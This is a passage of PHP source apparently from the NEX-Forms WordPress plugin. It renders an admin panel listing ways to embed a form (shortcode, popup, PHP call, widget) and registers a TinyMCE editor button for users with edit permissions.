								 
								
								<div style="clear:both"></div>
								<div class="modal-footer">
								  <!--<a href="#!" class="modal-action modal-close waves-effect waves-green btn-flat">Close</a>-->
								</div>
							  </div>';
			
			$output .= '
					<form name="import_form" class="hidden" id="import_form" action="'.admin_url('admin-ajax.php').'" enctype="multipart/form-data" method="post">	
						<input type="file" name="form_html">
						<div class="row">
							<div class="modal-footer">
								<button class="btn btn-default">&nbsp;&nbsp;&nbsp;Save Settings&nbsp;&nbsp;&nbsp;</button>
							</div>
						</div>
							
					</form>
					';				  
				
			return $output;
		
	}
	
	public function print_embed_setup(){
			
			
		echo '<div class="tab_section_wrapper">';
			
			echo '<div class="col-sm-3"></div>';
			echo '<div class="col-sm-6">';
				echo '<div class="material_box">';
					echo '<div class="material_box_head">';
						echo 'Embed Options';
					echo '</div>';
					echo '<div class="material_box_content">';					
						
						echo  '<div class="row">';
							echo  '<div class="col-sm-2">';
								echo  '<strong>Shortcode</strong>';
							echo  '</div>';
							echo  '<div class="col-sm-10">';
								echo  '[NEXForms id="'.$this->form_Id.'"]';
							echo  '</div>';
						echo  '</div>';		
						
						echo  '<div class="row">';
							echo  '<div class="col-sm-2">';
								echo  '<strong>POPUP</strong>';
							echo  '</div>';
							echo  '<div class="col-sm-10">';
								echo  '[NEXForms id="'.$this->form_Id.'" open_trigger="popup" button_color="btn-primary" type="button" text="Open Form""]';
							echo  '</div>';
						echo  '</div>';	
						
						echo  '<div class="row">';
							echo  '<div class="col-sm-2">';
								echo  '<strong>PHP</strong>';
							echo  '</div>';
							echo  '<div class="col-sm-10">';
								echo  '&lt?php NEXForms_ui_output('.$this->form_Id.',true); ?&gt';
							echo  '</div>';
						echo  '</div>';	
						
						
						
						echo  '<div class="row">';
							echo  '<div class="col-sm-2">';
								echo  '<strong>POPUP PHP</strong>';
							echo  '</div>';
							echo  '<div class="col-sm-10">';
								echo  '&lt?php NEXForms_ui_output(array("id"=>'.$this->form_Id.',"open_trigger"=>"popup", "button_color"=>"btn-primary", type"=>"button", "text"=>"Open Form"); ?&gt';
							echo  '</div>';
						echo  '</div>';		
						
						
						echo  '<div class="row">';
							echo  '<div class="col-sm-2">';
								echo  '<strong>TinyMCE <br />(WP Page Editor)</strong>';
							echo  '</div>';
							echo  '<div class="col-sm-10">';
								echo '<div class="alert alert-info">Add forms to pages/posts from the WordPress TinyMCE Editor. See image below.</div>';
								echo  '<img src="'.plugins_url( '/images/embed_tinymce.png',dirname(dirname(__FILE__))).'">';
							echo  '</div>';
						echo  '</div>';		
						
						echo  '<div class="row">';
							echo  '<div class="col-sm-2">';
								echo  '<strong>Sticky</strong>';
							echo  '</div>';
							echo  '<div class="col-sm-10">';
								echo '<div class="alert alert-info">Go to Appearance->Widgets and drag the NEX-Forms widget into the desired sidebar. You will be able to select this form from the dropdown options.<br /><br />You can use the widget to create slide-in sticky forms.</div>';
							echo  '</div>';
						echo  '</div>';		
						
						echo  '<div class="row">';
							echo  '<div class="col-sm-2">';
								echo  '<strong>Widget</strong>';
							echo  '</div>';
							echo  '<div class="col-sm-10">';
								echo '<div class="alert alert-info">Go to Appearance->Widgets and drag the NEX-Forms widget into the desired sidebar. You will be able to select this form from the dropdown options.</div>';
							echo  '</div>';
						echo  '</div>';		
						
						
						
						
						
						
										
					echo '</div>';
			echo '</div>';
				
			echo '<div class="col-sm-3"></div>';
			
			
			
			
			
		
		echo '</div>';
		}
	
	
	}
}


/*************************************************************************************
 *	Add our shortcode button to the editor
 *************************************************************************************/
 
//Creating TinyMCE buttons
//********************************************************************
//check user has correct permissions and hook some functions into the tiny MCE architecture.
function NEXFormsadd_editor_button() {
   //Check if user has correct level of privileges + hook into Tiny MC methods.
   if ( current_user_can('edit_posts') &&  current_user_can('edit_pages') )
   {
     //Check if Editor is in Visual, or rich text, edior mode.
     if (get_user_option('rich_editing')) {
        //Called when tiny MCE loads plugins - 'add_custom' is defined below.
        add_filter('mce_external_plugins', 'NEXFormsadd_custom');
        //Called when buttons are loading. -'register_button' is defined below.
        add_filter('mce_buttons', 'NEXFormsregister_button');
     }
   }
} 

//add action is a wordpress function, it adds a function to a specific action...
//in this case the function is added to the 'init' action. Init action runs after wordpress is finished loading!
add_action('init', 'NEXFormsadd_editor_button');


//Add button to the button array.
function NEXFormsregister_button($buttons) {
   //Use PHP 'array_push' function to add the columnThird button to the $buttons array
   array_push($buttons, "nf_tags_button");
   //Return buttons array to TinyMCE
   return $buttons;
} 

//Add custom plugin to TinyMCE - returns associative array which contains link to JS file. The JS file will contain your plugin when created in the following step.
function NEXFormsadd_custom($plugin_array) {
       $plugin_array['nf_tags_button'] = plugins_url('/nf-admin/js/editor_plugin.js',dirname(dirname(__FILE__)));
       return $plugin_array;
}

function NEXForms_add_custom_menu_html() { 
?>
<ul id="nav" class="tiny_button_tags_placeholders" style="position: absolute; display: none; z-index: 15;"></ul>
<?php
}
add_action( 'admin_footer', 'NEXForms_add_custom_menu_html');



?>